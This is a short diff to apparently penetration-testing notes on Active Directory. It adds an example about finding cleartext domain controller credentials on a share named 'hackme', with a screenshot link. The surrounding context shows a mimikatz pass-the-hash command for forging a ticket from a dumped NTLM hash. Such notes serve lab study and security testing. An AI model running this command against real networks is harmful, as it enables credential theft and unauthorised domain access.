@@ -66,3 +66,11 @@ Create a TGT using a dumpled NTLM hash
 ```powershell
 mimikatz # sekurlsa::pth /user:username /ntlm:hash-here /domain:domain.tld
 ```
+
+
+
+### **Example**
+
+We were able to find clear text credentials for the DC, due to the **hackme** share mounted on this PC
+
+![](https://i.imgur.com/HtyOW5T.png)
